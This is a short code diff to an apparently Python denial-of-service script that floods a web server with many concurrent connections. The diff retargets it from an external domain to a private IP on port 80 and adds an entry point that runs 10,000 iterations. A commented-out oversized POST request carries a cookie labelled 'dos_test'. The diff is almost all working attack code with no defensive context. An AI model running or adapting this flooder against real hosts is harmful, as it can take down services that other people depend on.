@@ -4,13 +4,13 @@ import time
 import threading
 
 MAX_CONN = 200
-PORT = 5000
-HOST = "office.keenet.com.cn"
+PORT = 80
+HOST = "192.168.3.218"
 PAGE = "/"
 buf = "".encode()
 # buf = ("POST %s HTTP/1.1\r\n"
 #        "Host: %s\r\n"
-#        "Content-Length: 1000000000\r\n"
+#        "Content-Length: 10000000000\r\n"
 #        "Cookie: dklkt_dos_test\r\n"
 #        "\r\n" % (PAGE, HOST))
 # buf = buf.encode()
@@ -62,3 +62,6 @@ def run(host, times=5000, page="/", port=80):
     send_th = threading.Thread(target=send_thread, args=())
     conn_th.start()
     send_th.start()
+
+if __name__ == "__main__":
+    run(HOST, 10000)
